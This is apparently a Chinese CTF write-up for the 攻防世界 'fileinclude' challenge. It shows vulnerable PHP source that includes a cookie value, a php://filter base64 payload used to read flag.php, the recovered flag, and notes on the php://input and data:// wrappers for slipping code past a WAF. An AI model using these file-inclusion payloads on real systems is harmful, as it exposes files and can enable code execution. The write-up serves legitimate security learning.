#  T2 fileinclude

> 题目：攻防世界 fileinclude

__0x00 审题__

打开题目如下，要寻找flag.php，与fileinclude的题目相关，考虑php伪协议读取文件

![image](https://github.com/uicciu/image/blob/main/fileinclude.png)

__0x01 操作__

打开源代码,看到一处长得就很重要的部位

```php
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
	@setcookie("language","english");
	@include("english.php");
}
else
{
	@include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
```

猜测：第一个if好像没啥用，先不知道他什么意思，$lan经历一次赋值，再经历一个if判断，感觉应该令其进行else的部分，以PHP的格式输出$lan中的内容，但是问题是最后输出$x中内容（即index.php中的内容）

接下来目标：展示flag.php中的内容

> $_COOKIE()

example:

```php
<?php
echo 'Hello ' . htmlspecialchars($_COOKIE["name"]) . '!';
?>
```

Assuming the "name" cookie has been set earlier

The above example will output something similar to:

```
Hello Hannes!
```

所以我们需要对language进行赋值

因为一直是对COOKIE进行操作，所以F12调出工具用自行下载的HackBar构造payload

language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag

得到如下一段密码：

```
PD9waHANCiRmbGFnPSJjeWJlcnBlYWNlezRkZTFlYzUyZjliZmRhMDZkMmE5NTM2MzE3ZDdmY2JkfSI7DQo/Pg== 
```

因为后面有两个等号补位，猜测其为Base64编码，用[Base64解码工具解码](https://base64.us/)

__0x02 答案__

解码结束，得到flag

```php
<?php
$flag="cyberpeace{4de1ec52f9bfda06d2a9536317d7fcbd}";
?>
```

__0x03 总结__

1. 应用到了文件包含，PHPfilter的伪协议读取文件，以及base64解码
2. 何为文件包含？有一个问题，为何'@include($lan.".php")' 存在漏洞，即明明echo内容为index.php但是最终得到flag.php，攻防世界官方WP中给出 _源代码中看到` @include($lan.".php"); `，可知此处存在文件包含_ 目前还不知道如何看出
3. 同时可以通过BurpSuit抓包更改Cookie
 
__0x04 补充__

攻防世界新手题中还有另一道名为fileinclude的题目，两者相似都需要进行代码审计，通过PHP伪协议传入，以下是补充PHP伪协议类型：

1. php://input:is a read-only stream that allows you to read raw data from the request body. php://input is not available with enctype="multipart/form-data".将执行代码通过在POST data中提交
2. php://filter:s a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening.

> php://filter/read=convert.base64-encode/resource={文件名}

3. data:// :将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。
